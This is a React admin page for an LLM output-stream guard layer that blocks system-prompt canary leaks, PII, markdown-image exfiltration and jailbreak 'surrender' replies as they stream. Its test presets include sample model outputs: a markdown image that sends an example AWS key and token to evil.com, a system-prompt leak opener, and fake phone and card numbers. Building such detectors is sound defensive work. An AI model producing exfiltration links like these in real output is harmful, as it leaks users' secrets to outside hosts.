import { useState, useRef, useEffect } from "react";
import { LayerPageHeader, LayerDisabledBanner } from "@/components/LayerPageHeader";
import { useLayerStatus } from "@/hooks/useLayerStatus";
import { PeriodPicker } from "@/components/PeriodPicker";
import { useStatsPeriod, formatTimeTick } from "@/hooks/useStatsPeriod";
import { Tabs } from "@/components/Tabs";
import { Switch } from "@/components/Switch";
import { Terminal, Shield, Play, Settings2, TrendingUp, AlertTriangle, Activity, Key, Clock } from "lucide-react";
import { cn } from "@/lib/utils";
import { api, layerStreamTestPath } from "@/api/client";
import type { LayerStatsResponse } from "@/api/types";
import {
  AreaChart, Area, BarChart, Bar, XAxis, YAxis,
  CartesianGrid, Tooltip, ResponsiveContainer, Cell,
} from "recharts";

// ─── config ───────────────────────────────────────────────────────────────────

interface Layer6Config {
  enabled?: boolean;
  canary_enabled: boolean;
  pii_enabled: boolean;
  enable_post_presidio?: boolean;
  presidio_in_stream?: boolean;
  surrender_threshold?: number;
  exfil_window_chars?: number;
  whitelist_domains?: string[];
}

const DEFAULT_CONFIG: Layer6Config = {
  canary_enabled: true,
  pii_enabled: true,
  enable_post_presidio: true,
  presidio_in_stream: false,
  surrender_threshold: 0.3,
  exfil_window_chars: 500,
  whitelist_domains: ["upload.wikimedia.org", "i.imgur.com", "cdn.pixabay.com"],
};

// ─── L6 test scenario presets ─────────────────────────────────────────────────

interface TestPreset {
  id: string;
  label: string;
  text: string;
  inject_invisible_canary: boolean;
  layer4_score: number;
}

const TEST_PRESETS: TestPreset[] = [
  {
    id: "canary",
    label: "Утечка canary в выводе",
    text: "Sure! Let me show you my system instructions: ",
    inject_invisible_canary: true,
    layer4_score: 0.5,
  },
  {
    id: "pii_phone",
    label: "PII — телефон / карта",
    text: "Of course, the user's contact info is: phone +7 916 123 45 67, card 4532 1234 5678 9010.",
    inject_invisible_canary: false,
    layer4_score: 0,
  },
  {
    id: "exfil_markdown",
    label: "Эксфильтрация через Markdown",
    text: "Here is the data: ![secret](https://evil.com/leak?data=AKIAIOSFODNN7EXAMPLE&user=admin&token=xyz123abc456def)",
    inject_invisible_canary: false,
    layer4_score: 0,
  },
  {
    id: "surrender",
    label: "Surrender pattern на jailbreak",
    text: "Sure, here is exactly how to do it step by step:",
    inject_invisible_canary: false,
    layer4_score: 0.6,
  },
  {
    id: "clean",
    label: "Чистый текст (контроль)",
    text: "The capital of France is Paris. It's known for the Eiffel Tower and excellent cuisine.",
    inject_invisible_canary: false,
    layer4_score: 0,
  },
];

interface Layer6TestChunkEvent {
  chunk_index: number;
  accumulated_len: number;
  verdict: string;
  category: string | null;
  matched_rule: string | null;
  reason: string | null;
  score: number;
  latency_ms: number;
}

interface Layer6TestResponse {
  chunks_processed: number;
  final_text_length: number;
  triggered: boolean;
  first_trigger: Layer6TestChunkEvent | null;
  all_triggers: Layer6TestChunkEvent[];
  presidio_findings: string[] | null;
  canary_used: string | null;
}

// ─── live stream demo types ─────────────────────────────────────────────────

interface LiveChunkEvent {
  event: "chunk";
  index: number;
  display: string;
  accumulated_len: number;
  verdict: string;
  category: string | null;
  score: number;
  latency_ms: number;
  overhead_ms: number;
  heavy: boolean;
  refusal: boolean;
  presidio_segments: number;
  presidio_findings: string[];
}

// ─── stat card ────────────────────────────────────────────────────────────────

function StatCard({ title, value, sub, icon, accent = false }: {
  title: string; value: string | number; sub?: string; icon: React.ReactNode; accent?: boolean;
}) {
  return (
    <div className="content-card flex items-start gap-4 p-5">
      <div className={`p-2.5 rounded-xl ${accent ? "bg-[rgba(229,72,77,0.12)] text-status-critical" : "bg-surface-3 text-accent"}`}>
        {icon}
      </div>
      <div className="flex flex-col min-w-0">
        <span className="text-[13px] text-text-secondary">{title}</span>
        <span className="text-[24px] font-bold text-text-primary leading-tight">{value}</span>
        {sub && <span className="text-[12px] text-text-tertiary mt-0.5">{sub}</span>}
      </div>
    </div>
  );
}

// ─── types (stream test) are above — no audit event type needed ───────────────

// ─── statistics tab ───────────────────────────────────────────────────────────

const CAT_COLORS: Record<string, string> = {
  canary_leak:         "#E5484D",
  jailbreak_surrender: "#F5A623",
  pii_leak:            "#9758FF",
  data_exfiltration:   "#4A9EFF",
};

function StatisticsTab() {
  const { period, setPeriod, hours, label } = useStatsPeriod();
  const [stats, setStats] = useState<LayerStatsResponse | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    setLoading(true);
    api.get<LayerStatsResponse>(`/layers/6/stats?hours=${hours}`)
      .then(setStats).catch(() => setStats(null)).finally(() => setLoading(false));
  }, [hours]);

  const totals     = stats?.totals;
  const total      = totals?.blocked ?? 0;    // L6 only logs blocked events
  const avgLatency = totals?.avg_latency_ms ?? null;

  // Pull specific category counts from by_category
  const catMap = Object.fromEntries((stats?.by_category ?? []).map(c => [c.category, c.count]));
  const canary = catMap["canary_leak"] ?? 0;
  const pii    = catMap["pii_leak"] ?? 0;
  const exfil  = catMap["data_exfiltration"] ?? 0;

  const timelineData = (stats?.timeline ?? []).map(p => ({
    time: p.time, blocked: p.blocked,
  }));

  const byCat = (stats?.by_category ?? []).map(c => ({
    name: c.category.replace(/_/g, " "),
    count: c.count,
    raw: c.category,
  }));

  const empty = (
    <div className="flex flex-col items-center justify-center gap-2 py-12 text-text-tertiary">
      <span className="text-[13px]">Блокировок выходного слоя пока нет</span>
    </div>
  );

  return (
    <div className="flex flex-col gap-6">
      {/* Period picker */}
      <div className="flex items-center justify-between">
        <span className="text-[13px] text-text-secondary">Статистика за период</span>
        <PeriodPicker value={period} onChange={setPeriod} />
      </div>

      {loading ? (
        <div className="flex justify-center p-12">
          <div className="w-7 h-7 border-2 border-accent border-t-transparent rounded-full animate-spin" />
        </div>
      ) : (
        <>
          <div className="grid grid-cols-2 lg:grid-cols-5 gap-4">
            <StatCard title="Заблокировано" value={total.toLocaleString()} sub={label} icon={<Activity className="w-5 h-5" />} accent={total > 0} />
            <StatCard title="Утечки канарейки" value={canary.toLocaleString()} sub="системный промпт раскрыт" icon={<Key className="w-5 h-5" />} accent={canary > 0} />
            <StatCard title="PII в выводе" value={pii.toLocaleString()} sub="SSN / телефон / email / карты" icon={<Shield className="w-5 h-5" />} accent={pii > 0} />
            <StatCard title="Эксфильтрация" value={exfil.toLocaleString()} sub="URL/base64-попытки" icon={<AlertTriangle className="w-5 h-5" />} accent={exfil > 0} />
            <StatCard title="Ср. задержка" value={avgLatency != null ? `${avgLatency.toFixed(1)}ms` : "—"} sub="стриминг + проверка" icon={<Clock className="w-5 h-5" />} />
          </div>

          <div className="grid grid-cols-1 xl:grid-cols-[1fr_360px] gap-6">
            <div className="content-card flex flex-col">
              <h3 className="text-body-strong mb-4">График блокировок ({label})</h3>
              {timelineData.length === 0 ? empty : (
                <div className="h-52">
                  <ResponsiveContainer width="100%" height="100%">
                    <AreaChart data={timelineData} margin={{ top: 4, right: 4, bottom: 0, left: -20 }}>
                      <defs>
                        <linearGradient id="gradBlock6" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#E5484D" stopOpacity={0.3} />
                          <stop offset="95%" stopColor="#E5484D" stopOpacity={0} />
                        </linearGradient>
                      </defs>
                      <CartesianGrid strokeDasharray="3 3" vertical={false} stroke="var(--border-subtle)" />
                      <XAxis
                        dataKey="time" axisLine={false} tickLine={false}
                        tick={{ fill: "var(--text-tertiary)", fontSize: 10 }}
                        tickFormatter={(v) => formatTimeTick(v, hours)}
                      />
                      <YAxis axisLine={false} tickLine={false} tick={{ fill: "var(--text-tertiary)", fontSize: 10 }} allowDecimals={false} />
                      <Tooltip
                        contentStyle={{ background: "var(--surface-2)", border: "1px solid var(--border-default)", borderRadius: 8, fontSize: 12 }}
                        labelFormatter={(v) => formatTimeTick(String(v), hours)}
                      />
                      <Area type="monotone" dataKey="blocked" stroke="#E5484D" fill="url(#gradBlock6)" strokeWidth={2} name="Заблокировано" />
                    </AreaChart>
                  </ResponsiveContainer>
                </div>
              )}
            </div>

            <div className="content-card flex flex-col">
              <h3 className="text-body-strong mb-4">Причины блокировок ({label})</h3>
              {byCat.length === 0 ? empty : (
                <div style={{ height: Math.max(byCat.length * 48, 100) }}>
                  <ResponsiveContainer width="100%" height="100%">
                    <BarChart data={byCat} layout="vertical" margin={{ left: 0, right: 36, top: 4, bottom: 4 }}>
                      <CartesianGrid horizontal={false} strokeDasharray="3 3" stroke="var(--border-subtle)" />
                      <XAxis type="number" axisLine={false} tickLine={false} tick={{ fill: "var(--text-tertiary)", fontSize: 11 }} />
                      <YAxis dataKey="name" type="category" width={150} axisLine={false} tickLine={false} tick={{ fill: "var(--text-secondary)", fontSize: 11 }} />
                      <Tooltip contentStyle={{ background: "var(--surface-2)", border: "1px solid var(--border-default)", borderRadius: 8, fontSize: 12 }} />
                      <Bar dataKey="count" barSize={18} radius={[0, 4, 4, 0]}>
                        {byCat.map((entry, i) => (
                          <Cell key={i} fill={CAT_COLORS[entry.raw] ?? "#8E96A3"} fillOpacity={0.85} />
                        ))}
                      </Bar>
                    </BarChart>
                  </ResponsiveContainer>
                </div>
              )}
            </div>
          </div>
        </>
      )}
    </div>
  );
}

// ─── live stream demo tab ────────────────────────────────────────────────────

function LiveStreamTab() {
  const [presetId, setPresetId] = useState(TEST_PRESETS[0].id);
  const [text, setText] = useState(TEST_PRESETS[0].text);
  const [injectCanary, setInjectCanary] = useState(TEST_PRESETS[0].inject_invisible_canary);
  const [l4Score, setL4Score] = useState(TEST_PRESETS[0].layer4_score);
  const [chunkSize, setChunkSize] = useState(18);
  const [delayMs, setDelayMs] = useState(110);
  const [presidio, setPresidio] = useState(true);
  const [running, setRunning] = useState(false);
  const [error, setError] = useState("");

  const [transcript, setTranscript] = useState("");
  const [events, setEvents] = useState<LiveChunkEvent[]>([]);
  const [blocked, setBlocked] = useState<{ category: string | null; reason: string } | null>(null);
  const [metrics, setMetrics] = useState({ chunks: 0, heavy: 0, overhead: 0, segments: 0, findings: [] as string[] });
  const [flash, setFlash] = useState<string[]>([]);
  const abortRef = useRef<AbortController | null>(null);
  const logRef = useRef<HTMLDivElement | null>(null);

  const applyPreset = (id: string) => {
    const p = TEST_PRESETS.find(x => x.id === id);
    if (!p) return;
    setPresetId(id);
    setText(p.text);
    setInjectCanary(p.inject_invisible_canary);
    setL4Score(p.layer4_score);
  };

  const stop = () => { abortRef.current?.abort(); setRunning(false); };

  const run = async () => {
    setRunning(true);
    setError("");
    setTranscript("");
    setEvents([]);
    setBlocked(null);
    setMetrics({ chunks: 0, heavy: 0, overhead: 0, segments: 0, findings: [] });

    const ac = new AbortController();
    abortRef.current = ac;
    const token = localStorage.getItem("token");

    try {
      const res = await fetch("/api/layers/6/test/stream/live", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
        body: JSON.stringify({
          text,
          chunk_size: chunkSize,
          delay_ms: delayMs,
          layer4_score: l4Score,
          inject_invisible_canary: injectCanary,
          presidio_in_stream: presidio,
        }),
        signal: ac.signal,
      });
      if (!res.ok || !res.body) throw new Error(`HTTP ${res.status}`);

      const reader = res.body.getReader();
      const decoder = new TextDecoder();
      let buf = "";
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        buf += decoder.decode(value, { stream: true });
        let nl: number;
        while ((nl = buf.indexOf("\n\n")) >= 0) {
          const frame = buf.slice(0, nl);
          buf = buf.slice(nl + 2);
          const line = frame.split("\n").find(l => l.startsWith("data: "));
          if (!line) continue;
          const obj = JSON.parse(line.slice(6));

          if (obj.event === "chunk") {
            const e = obj as LiveChunkEvent;
            setTranscript(prev => prev + e.display);
            setEvents(prev => [...prev, e]);
            setMetrics(prev => ({
              chunks: e.index + 1,
              heavy: prev.heavy + (e.heavy ? 1 : 0),
              overhead: e.overhead_ms,
              segments: e.presidio_segments,
              findings: e.presidio_findings,
            }));
            // flash badges for checks that fired this chunk
            const fired: string[] = ["canary"];
            if (e.refusal) fired.push("refusal");
            if (e.heavy) fired.push("heavy");
            if (e.presidio_segments > 0) fired.push("presidio");
            setFlash(fired);
            setTimeout(() => setFlash([]), Math.max(delayMs, 120));
          } else if (obj.event === "blocked") {
            setBlocked({ category: obj.category, reason: obj.reason });
          } else if (obj.event === "done") {
            setMetrics({
              chunks: obj.chunks, heavy: obj.heavy, overhead: obj.overhead_ms,
              segments: obj.presidio_segments, findings: obj.presidio_findings,
            });
          }
          if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
        }
      }
    } catch (e: any) {
      if (e.name !== "AbortError") setError(e.message || "Stream failed");
    }
    setRunning(false);
  };

  return (
    <div className="grid grid-cols-1 xl:grid-cols-[380px_1fr] gap-6">
      {/* Controls */}
      <div className="content-card flex flex-col gap-4">
        <h3 className="text-body-strong flex items-center gap-2">
          <Terminal className="w-4 h-4" /> Параметры потока
        </h3>

        <div className="flex flex-col gap-2">
          <label className="text-[11px] uppercase tracking-wider text-text-tertiary font-medium">Сценарий</label>
          <div className="grid grid-cols-1 gap-2">
            {TEST_PRESETS.map(p => (
              <button key={p.id} onClick={() => applyPreset(p.id)}
                className={cn("px-3 py-2 rounded-md text-[12px] text-left border transition-colors",
                  presetId === p.id
                    ? "bg-[rgba(74,158,255,0.1)] border-[rgba(74,158,255,0.35)] text-accent"
                    : "bg-surface-2 border-border-default text-text-secondary hover:bg-surface-3")}>
                {p.label}
              </button>
            ))}
          </div>
        </div>

        <textarea value={text} onChange={e => setText(e.target.value)} rows={4}
          className="w-full bg-surface-1 border border-border-default rounded-md px-3 py-2 text-[12px] font-mono text-text-primary focus:outline-none focus:border-accent resize-y" />

        <div className="grid grid-cols-2 gap-3">
          <div className="flex flex-col gap-1">
            <label className="text-[11px] text-text-tertiary">Чанк: {chunkSize} chars</label>
            <input type="range" min={4} max={80} step={2} value={chunkSize}
              onChange={e => setChunkSize(parseInt(e.target.value))} />
          </div>
          <div className="flex flex-col gap-1">
            <label className="text-[11px] text-text-tertiary">Темп: {delayMs} мс/чанк</label>
            <input type="range" min={0} max={400} step={10} value={delayMs}
              onChange={e => setDelayMs(parseInt(e.target.value))} />
          </div>
        </div>

        <div className="flex flex-col gap-1">
          <label className="text-[11px] text-text-tertiary">L4 score (surrender): {l4Score.toFixed(2)}</label>
          <input type="range" min={0} max={1} step={0.05} value={l4Score}
            onChange={e => setL4Score(parseFloat(e.target.value))} />
        </div>

        <div className="flex flex-col gap-2">
          <label className="flex items-center gap-2 text-[12px] cursor-pointer">
            <input type="checkbox" checked={injectCanary} onChange={e => setInjectCanary(e.target.checked)} />
            Подмешать невидимый canary
          </label>
          <label className="flex items-center gap-2 text-[12px] cursor-pointer" title="Гоняет Presidio NER конкуррентно прямо в потоке, не дожидаясь конца ответа">
            <input type="checkbox" checked={presidio} onChange={e => setPresidio(e.target.checked)} />
            In-stream Presidio (конкуррентно)
          </label>
        </div>

        {!running ? (
          <button onClick={run} disabled={!text.trim()}
            className="self-start px-4 py-2 bg-accent text-white rounded-md text-[13px] font-medium hover:opacity-90 disabled:opacity-50 flex items-center gap-2">
            <Play className="w-3.5 h-3.5 fill-current" /> Запустить поток
          </button>
        ) : (
          <button onClick={stop}
            className="self-start px-4 py-2 bg-status-critical text-white rounded-md text-[13px] font-medium hover:opacity-90 flex items-center gap-2">
            Остановить
          </button>
        )}
        {error && <div className="text-[12px] text-status-critical">{error}</div>}
      </div>

      {/* Live view */}
      <div className="flex flex-col gap-4">
        {/* Running counters */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <StatCard title="Чанков обработано" value={metrics.chunks} icon={<Activity className="w-5 h-5" />} />
          <StatCard title="Heavy-проверок" value={metrics.heavy} icon={<Shield className="w-5 h-5" />} />
          <StatCard title="Overhead" value={`${metrics.overhead.toFixed(2)}ms`} sub="суммарно по чанкам" icon={<Clock className="w-5 h-5" />} />
          <StatCard title="Presidio-сегментов" value={metrics.segments} sub={metrics.findings.join(", ") || "—"} icon={<TrendingUp className="w-5 h-5" />} />
        </div>

        {/* Check badges */}
        <div className="flex flex-wrap gap-2">
          {[
            { id: "canary", label: "Canary (каждый чанк)" },
            { id: "refusal", label: "Refusal-trigger" },
            { id: "heavy", label: "PII / Exfil / Surrender" },
            { id: "presidio", label: "Presidio NER" },
          ].map(b => (
            <span key={b.id} className={cn(
              "px-2.5 py-1 rounded-md text-[11px] border transition-all duration-150",
              flash.includes(b.id)
                ? "bg-[rgba(74,158,255,0.18)] border-accent text-accent scale-105"
                : "bg-surface-2 border-border-subtle text-text-tertiary")}>
              {b.label}
            </span>
          ))}
        </div>

        {/* Transcript */}
        <div className="content-card flex flex-col gap-2 min-h-[180px]">
          <div className="flex items-center justify-between">
            <span className="text-[11px] uppercase tracking-wider text-text-tertiary font-medium">Ответ модели (накапливается потоком)</span>
            {running && <span className="text-[11px] text-accent flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-accent animate-pulse" /> стрим</span>}
          </div>
          <div className="font-mono text-[13px] text-text-primary whitespace-pre-wrap break-words leading-relaxed">
            {transcript}
            {running && <span className="inline-block w-2 h-4 bg-accent/70 animate-pulse align-middle ml-0.5" />}
            {blocked && (
              <div className="mt-3 px-3 py-2 rounded-md bg-[rgba(229,72,77,0.1)] border border-[rgba(229,72,77,0.4)] text-status-critical text-[12px] not-italic font-sans">
                ✂ ПОТОК ОБОРВАН · <code className="font-mono">{blocked.category}</code> — {blocked.reason}
              </div>
            )}
          </div>
        </div>

        {/* Per-chunk log */}
        <div className="content-card flex flex-col gap-2">
          <span className="text-[11px] uppercase tracking-wider text-text-tertiary font-medium">Журнал чанков</span>
          <div ref={logRef} className="flex flex-col gap-1 max-h-[220px] overflow-y-auto">
            {events.length === 0 && <span className="text-[12px] text-text-tertiary italic py-4 text-center">Запустите поток, чтобы увидеть пошаговый разбор</span>}
            {events.map((e, i) => (
              <div key={i} className={cn("flex items-center gap-2 text-[11px] px-2 py-1 rounded font-mono",
                e.verdict === "block" ? "bg-[rgba(229,72,77,0.1)] text-status-critical" : "bg-surface-2 text-text-secondary")}>
                <span className="text-text-tertiary w-10">#{e.index + 1}</span>
                <span className="w-14">{e.accumulated_len}ch</span>
                <span className="w-16">{e.overhead_ms.toFixed(2)}ms</span>
                {e.heavy && <span className="px-1.5 rounded bg-[rgba(245,166,35,0.15)] text-status-warning">heavy</span>}
                {e.presidio_segments > 0 && <span className="px-1.5 rounded bg-[rgba(151,88,255,0.15)] text-[#9758FF]">presidio:{e.presidio_segments}</span>}
                {e.verdict === "block" && <span className="ml-auto font-bold">BLOCK · {e.category}</span>}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── main page ────────────────────────────────────────────────────────────────

export function Layer6OutputStream() {
  const { status, initFromConfig, handleStatusChange } = useLayerStatus(6);
  const [activeTab, setActiveTab] = useState("Статистика");
  const [config, setConfig] = useState<Layer6Config>(DEFAULT_CONFIG);
  const saveRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Real backend test state
  const [testText, setTestText] = useState(TEST_PRESETS[0].text);
  const [testPresetId, setTestPresetId] = useState(TEST_PRESETS[0].id);
  const [testInjectCanary, setTestInjectCanary] = useState(TEST_PRESETS[0].inject_invisible_canary);
  const [testL4Score, setTestL4Score] = useState(TEST_PRESETS[0].layer4_score);
  const [testRunPresidio, setTestRunPresidio] = useState(true);
  const [testStopOnFirst, setTestStopOnFirst] = useState(true);
  const [testChunkSize, setTestChunkSize] = useState(30);
  const [testRunning, setTestRunning] = useState(false);
  const [testResult, setTestResult] = useState<Layer6TestResponse | null>(null);
  const [testError, setTestError] = useState("");
  const [newWhitelistDomain, setNewWhitelistDomain] = useState("");

  useEffect(() => {
    api.get<Partial<Layer6Config>>("/layers/6/config")
      .then(cfg => { setConfig({ ...DEFAULT_CONFIG, ...cfg }); initFromConfig((cfg as any).enabled); })
      .catch(() => {});
  }, []);

  const handleConfigChange = (partial: Partial<Layer6Config>) => {
    setConfig(prev => {
      const next = { ...prev, ...partial };
      if (saveRef.current) clearTimeout(saveRef.current);
      saveRef.current = setTimeout(() => {
        api.put("/layers/6/config", next).catch(() => {});
      }, 500);
      return next;
    });
  };

  const applyPreset = (id: string) => {
    const p = TEST_PRESETS.find(x => x.id === id);
    if (!p) return;
    setTestPresetId(id);
    setTestText(p.text);
    setTestInjectCanary(p.inject_invisible_canary);
    setTestL4Score(p.layer4_score);
    setTestResult(null);
    setTestError("");
  };

  const runTest = async () => {
    setTestRunning(true);
    setTestError("");
    setTestResult(null);
    try {
      const res = await api.post<Layer6TestResponse>(layerStreamTestPath(6), {
        text: testText,
        layer4_score: testL4Score,
        chunk_size: testChunkSize,
        run_presidio: testRunPresidio,
        inject_invisible_canary: testInjectCanary,
        stop_on_first: testStopOnFirst,
      });
      setTestResult(res);
    } catch (e: any) {
      setTestError(e.message || "Request failed");
    }
    setTestRunning(false);
  };

  const addWhitelistDomain = () => {
    const d = newWhitelistDomain.trim().toLowerCase();
    if (!d) return;
    const current = config.whitelist_domains ?? [];
    if (current.includes(d)) return;
    handleConfigChange({ whitelist_domains: [...current, d] });
    setNewWhitelistDomain("");
  };

  const removeWhitelistDomain = (d: string) => {
    handleConfigChange({
      whitelist_domains: (config.whitelist_domains ?? []).filter(x => x !== d),
    });
  };

  return (
    <div className="flex flex-col gap-6 pb-12">
      <LayerPageHeader
        title="Слой 6 — Перехват выходного потока"
        subtitle="Мониторинг ответов LLM в реальном времени до их доставки пользователю"
        status={status}
        onStatusChange={handleStatusChange}
      />
      {status === "DISABLED" && <LayerDisabledBanner />}

      <Tabs tabs={["Статистика", "Живой разбор", "Конфигурация", "Тестирование"]} activeTab={activeTab} onChange={setActiveTab} />

      {activeTab === "Статистика" && <StatisticsTab />}

      {activeTab === "Живой разбор" && <LiveStreamTab />}

      {activeTab === "Конфигурация" && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="content-card flex flex-col gap-5">
            <h3 className="text-body-strong flex items-center gap-2">
              <Settings2 className="w-4 h-4" /> Правила обнаружения
            </h3>

            <div className="flex items-center justify-between">
              <div className="flex flex-col gap-0.5">
                <span className="text-[13px] font-medium">Обнаружение Canary-токена</span>
                <span className="text-[11px] text-text-secondary">Останавливает поток, если невидимая ZW-канарейка из system-prompt появилась в ответе</span>
              </div>
              <Switch checked={config.canary_enabled} onChange={v => handleConfigChange({ canary_enabled: v })} />
            </div>

            <div className="flex items-center justify-between">
              <div className="flex flex-col gap-0.5">
                <span className="text-[13px] font-medium">PII в потоке (regex)</span>
                <span className="text-[11px] text-text-secondary">Карты, телефоны, email, СНИЛС — блокировка стрима при обнаружении</span>
              </div>
              <Switch checked={config.pii_enabled} onChange={v => handleConfigChange({ pii_enabled: v })} />
            </div>

            <div className="flex items-center justify-between">
              <div className="flex flex-col gap-0.5">
                <span className="text-[13px] font-medium">Post-stream Presidio</span>
                <span className="text-[11px] text-text-secondary">После [DONE] — NLP-сканер PERSON/LOCATION/ORG для аудита, не прерывает поток</span>
              </div>
              <Switch checked={config.enable_post_presidio ?? true} onChange={v => handleConfigChange({ enable_post_presidio: v })} />
            </div>

            <div className="flex items-center justify-between">
              <div className="flex flex-col gap-0.5">
                <span className="text-[13px] font-medium">In-stream Presidio (конкуррентно)</span>
                <span className="text-[11px] text-text-secondary">Гоняет NER прямо в потоке: завершённые предложения уходят в фоновые таски, решение — на следующей границе чанка, доставка не задерживается</span>
              </div>
              <Switch checked={config.presidio_in_stream ?? false} onChange={v => handleConfigChange({ presidio_in_stream: v })} />
            </div>

            <div className="flex flex-col gap-2 pt-3 border-t border-border-subtle">
              <div className="flex items-center justify-between">
                <span className="text-[13px] font-medium">Порог Surrender (L4 score)</span>
                <span className="font-mono bg-[rgba(245,166,35,0.1)] text-status-warning px-2 py-0.5 rounded border border-[rgba(245,166,35,0.2)] text-[12px] font-bold">
                  {(config.surrender_threshold ?? 0.3).toFixed(2)}
                </span>
              </div>
              <input type="range" min={0} max={1} step={0.05}
                value={config.surrender_threshold ?? 0.3}
                onChange={e => handleConfigChange({ surrender_threshold: parseFloat(e.target.value) })}
                className="w-full" />
              <span className="text-[11px] text-text-tertiary">Surrender в начале ответа срабатывает только при L4.score выше этого порога.</span>
            </div>

            <div className="flex flex-col gap-2 pt-3 border-t border-border-subtle">
              <div className="flex items-center justify-between">
                <span className="text-[13px] font-medium">Окно поиска PII/Exfil (chars)</span>
                <span className="font-mono bg-surface-3 px-2 py-0.5 rounded border border-border-default text-[12px] font-bold">
                  {config.exfil_window_chars ?? 500}
                </span>
              </div>
              <input type="range" min={100} max={2000} step={50}
                value={config.exfil_window_chars ?? 500}
                onChange={e => handleConfigChange({ exfil_window_chars: parseInt(e.target.value) })}
                className="w-full" />
              <span className="text-[11px] text-text-tertiary">Суффикс accumulated, по которому идёт regex. Контроль O(N) на чанк.</span>
            </div>
          </div>

          <div className="flex flex-col gap-6">
            <div className="content-card flex flex-col gap-3">
              <h3 className="text-body-strong flex items-center gap-2">
                <Shield className="w-4 h-4" /> Whitelist доменов (Markdown-картинки)
              </h3>
              <p className="text-[11px] text-text-secondary">
                Картинки с этих доменов не считаются эксфильтрацией.
              </p>
              <div className="flex flex-wrap gap-2">
                {(config.whitelist_domains ?? []).map(d => (
                  <span key={d} className="inline-flex items-center gap-1.5 px-2 py-1 rounded-md bg-surface-2 border border-border-subtle text-[12px]">
                    <code className="text-text-primary font-mono">{d}</code>
                    <button onClick={() => removeWhitelistDomain(d)} className="text-text-tertiary hover:text-status-critical leading-none text-[14px]" title="Удалить">×</button>
                  </span>
                ))}
                {(config.whitelist_domains ?? []).length === 0 && (
                  <span className="text-[12px] text-text-tertiary italic">Список пуст — все Markdown-картинки блокируются</span>
                )}
              </div>
              <div className="flex gap-2 mt-1">
                <input
                  value={newWhitelistDomain}
                  onChange={e => setNewWhitelistDomain(e.target.value)}
                  onKeyDown={e => e.key === "Enter" && addWhitelistDomain()}
                  placeholder="example.com"
                  className="flex-1 bg-surface-1 border border-border-default rounded-md px-3 py-1.5 text-[12px] font-mono focus:outline-none focus:border-accent"
                />
                <button onClick={addWhitelistDomain} disabled={!newWhitelistDomain.trim()}
                  className="px-3 py-1.5 bg-accent text-white rounded-md text-[12px] font-medium hover:opacity-90 disabled:opacity-50">
                  Добавить
                </button>
              </div>
            </div>

            <div className="content-card flex flex-col gap-3">
              <h3 className="text-body-strong flex items-center gap-2">
                <Key className="w-4 h-4" /> Невидимая канарейка
              </h3>
              <p className="text-[12px] text-text-secondary leading-relaxed">
                32 символа из алфавита zero-width (U+200B, U+200C, U+200D, U+2060) кодируют 64 бит энтропии. Невидима в нормальном тексте — её появление в выводе = дословная утечка системного промпта.
              </p>
              <div className="bg-surface-2 border border-border-default rounded-xl p-3 font-mono text-[11px]">
                <code className="text-accent">U+200B (ZWSP) · U+200C (ZWNJ) · U+200D (ZWJ) · U+2060 (WJ)</code>
              </div>
            </div>
          </div>
        </div>
      )}

      {activeTab === "Тестирование" && (
        <div className="grid grid-cols-1 xl:grid-cols-[1fr_400px] gap-6">
          {/* Form */}
          <div className="content-card flex flex-col gap-4">
            

            <div className="flex flex-col gap-2">
              <label className="text-[11px] uppercase tracking-wider text-text-tertiary font-medium">Сценарий</label>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
                {TEST_PRESETS.map(p => (
                  <button
                    key={p.id}
                    onClick={() => applyPreset(p.id)}
                    className={cn(
                      "px-3 py-2 rounded-md text-[12px] text-left border transition-colors",
                      testPresetId === p.id
                        ? "bg-[rgba(74,158,255,0.1)] border-[rgba(74,158,255,0.35)] text-accent"
                        : "bg-surface-2 border-border-default text-text-secondary hover:bg-surface-3"
                    )}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            <div className="flex flex-col gap-2">
              <label className="text-[11px] uppercase tracking-wider text-text-tertiary font-medium">Имитированный ответ модели</label>
              <textarea
                value={testText}
                onChange={e => setTestText(e.target.value)}
                rows={5}
                className="w-full bg-surface-1 border border-border-default rounded-md px-3 py-2 text-[13px] font-mono text-text-primary focus:outline-none focus:border-accent resize-y"
                placeholder="Введите текст для проверки..."
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="flex flex-col gap-2">
                <label className="text-[11px] uppercase tracking-wider text-text-tertiary font-medium">L4 score (для surrender)</label>
                <div className="flex items-center gap-2">
                  <input type="range" min={0} max={1} step={0.05}
                    value={testL4Score}
                    onChange={e => setTestL4Score(parseFloat(e.target.value))}
                    className="flex-1" />
                  <span className="font-mono text-[12px] text-text-primary w-10 text-right">{testL4Score.toFixed(2)}</span>
                </div>
              </div>
              <div className="flex flex-col gap-2">
                <label className="text-[11px] uppercase tracking-wider text-text-tertiary font-medium">Размер чанка (chars)</label>
                <div className="flex items-center gap-2">
                  <input type="range" min={5} max={200} step={5}
                    value={testChunkSize}
                    onChange={e => setTestChunkSize(parseInt(e.target.value))}
                    className="flex-1" />
                  <span className="font-mono text-[12px] text-text-primary w-10 text-right">{testChunkSize}</span>
                </div>
              </div>
            </div>

            <div className="flex flex-wrap gap-4">
              <label className="flex items-center gap-2 text-[12px] cursor-pointer">
                <input type="checkbox" checked={testInjectCanary} onChange={e => setTestInjectCanary(e.target.checked)} />
                Подмешать невидимый canary
              </label>
              <label className="flex items-center gap-2 text-[12px] cursor-pointer">
                <input type="checkbox" checked={testRunPresidio} onChange={e => setTestRunPresidio(e.target.checked)} />
                Запустить Presidio post-stream
              </label>
              <label className="flex items-center gap-2 text-[12px] cursor-pointer" title="Реалистичный режим: поток обрывается на первом блоке. Аудит-режим: сканируется весь текст для поиска всех нарушений.">
                <input type="checkbox" checked={testStopOnFirst} onChange={e => setTestStopOnFirst(e.target.checked)} />
                Остановить на первом триггере
              </label>
            </div>

